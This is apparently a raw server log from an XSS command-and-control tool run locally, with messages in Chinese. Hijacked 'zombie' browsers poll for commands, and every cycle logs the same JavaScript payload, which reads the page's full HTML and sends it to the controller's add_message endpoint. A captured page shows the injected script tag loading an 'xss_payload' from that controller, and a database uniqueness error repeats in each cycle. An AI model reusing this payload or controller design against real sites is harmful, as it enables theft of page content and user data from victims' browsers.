2025-06-26 22:37:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:37:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:37:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:37:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:37:11 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:37:11 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:37:11.129Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:37:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0047s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:37:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:11] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:37:11 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '完整頁面HTML: <html><head>\n    <meta charset="UTF-8">\n    <title> My website</title>\n</head>\n\n<body>\n    <h1>Hello World</h1>\n    \\\n    <div cla ... (203 characters truncated) ... ent" placeholder="Enter your comment">\n            <button type="submit">Submit</button>\n        </form>\n    </h2>\n\n\n</div></div></body></html>', None, '2025-06-26 22:37:11.134449', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:37:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0042s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 22:37:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:11] "[35m[1mGET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 22:37:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:37:16 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:37:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:37:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:37:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:37:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:37:16 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:37:16 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:37:16.130Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:37:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0043s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:37:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:16] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:37:16 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '完整頁面HTML: <html><head>\n    <meta charset="UTF-8">\n    <title> My website</title>\n</head>\n\n<body>\n    <h1>Hello World</h1>\n    \\\n    <div cla ... (203 characters truncated) ... ent" placeholder="Enter your comment">\n            <button type="submit">Submit</button>\n        </form>\n    </h2>\n\n\n</div></div></body></html>', None, '2025-06-26 22:37:16.135974', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:37:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0047s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 22:37:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:16] "[35m[1mGET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 22:37:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:37:21 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:37:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:37:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:37:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:37:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:37:21 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:37:21 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:37:21.129Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:37:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0061s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:37:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:21] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:37:21 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '完整頁面HTML: <html><head>\n    <meta charset="UTF-8">\n    <title> My website</title>\n</head>\n\n<body>\n    <h1>Hello World</h1>\n    \\\n    <div cla ... (203 characters truncated) ... ent" placeholder="Enter your comment">\n            <button type="submit">Submit</button>\n        </form>\n    </h2>\n\n\n</div></div></body></html>', None, '2025-06-26 22:37:21.136943', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:37:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0045s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 22:37:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:21] "[35m[1mGET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 22:37:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:37:26 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:37:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:37:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:37:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:37:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:37:26 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:37:26 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:37:26.132Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:37:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0037s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:37:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:26] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:37:26 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '完整頁面HTML: <html><head>\n    <meta charset="UTF-8">\n    <title> My website</title>\n</head>\n\n<body>\n    <h1>Hello World</h1>\n    \\\n    <div cla ... (203 characters truncated) ... ent" placeholder="Enter your comment">\n            <button type="submit">Submit</button>\n        </form>\n    </h2>\n\n\n</div></div></body></html>', None, '2025-06-26 22:37:26.135449', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:37:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0037s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 22:37:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:26] "[35m[1mGET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 22:37:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:37:31 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:37:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:37:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:37:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:37:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:37:31 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:37:31 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:37:31.130Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:37:31 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '完整頁面HTML: <html><head>\n    <meta charset="UTF-8">\n    <title> My website</title>\n</head>\n\n<body>\n    <h1>Hello World</h1>\n    \\\n    <div cla ... (203 characters truncated) ... ent" placeholder="Enter your comment">\n            <button type="submit">Submit</button>\n        </form>\n    </h2>\n\n\n</div></div></body></html>', None, '2025-06-26 22:37:31.134580', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:37:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0058s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:37:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0044s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 22:37:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:31] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:37:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:31] "[35m[1mGET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 22:37:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:37:36 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:37:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:37:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:37:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:37:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:37:36 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:37:36 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '完整頁面HTML: <html><head>\n    <meta charset="UTF-8">\n    <title> My website</title>\n</head>\n\n<body>\n    <h1>Hello World</h1>\n    \\\n    <div cla ... (203 characters truncated) ... ent" placeholder="Enter your comment">\n            <button type="submit">Submit</button>\n        </form>\n    </h2>\n\n\n</div></div></body></html>', None, '2025-06-26 22:37:36.135197', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:37:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0013s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 22:37:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:36] "[35m[1mGET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 22:37:36 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:37:36.131Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:37:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0061s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:37:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:36] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:37:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:37:41 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:37:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:37:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:37:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:37:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:37:41 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:37:41 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:37:41.128Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:37:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0058s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:37:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:41] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:37:41 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '完整頁面HTML: <html><head>\n    <meta charset="UTF-8">\n    <title> My website</title>\n</head>\n\n<body>\n    <h1>Hello World</h1>\n    \\\n    <div cla ... (203 characters truncated) ... ent" placeholder="Enter your comment">\n            <button type="submit">Submit</button>\n        </form>\n    </h2>\n\n\n</div></div></body></html>', None, '2025-06-26 22:37:41.133313', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:37:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0048s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 22:37:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:41] "[35m[1mGET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1[0m" 500 -
2025-06-26 22:37:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:37:46 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 22:37:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0035s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:37:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:37:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:37:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:37:46 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:37:46 | INFO     | control_route.py:244 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:37:46.134Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:37:46 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '完整頁面HTML: <html><head>\n    <meta charset="UTF-8">\n    <title> My website</title>\n</head>\n\n<body>\n    <h1>Hello World</h1>\n    \\\n    <div cla ... (203 characters truncated) ... ent" placeholder="Enter your comment">\n            <button type="submit">Submit</button>\n        </form>\n    </h2>\n\n\n</div></div></body></html>', None, '2025-06-26 22:37:46.141095', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 22:37:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0074s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:37:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0052s) -> 回傳: (<Response 766 bytes [200 OK]>, 500)
2025-06-26 22:37:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:46] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:37:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:37:46] "[35m[1mGET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1[0m" 500 -
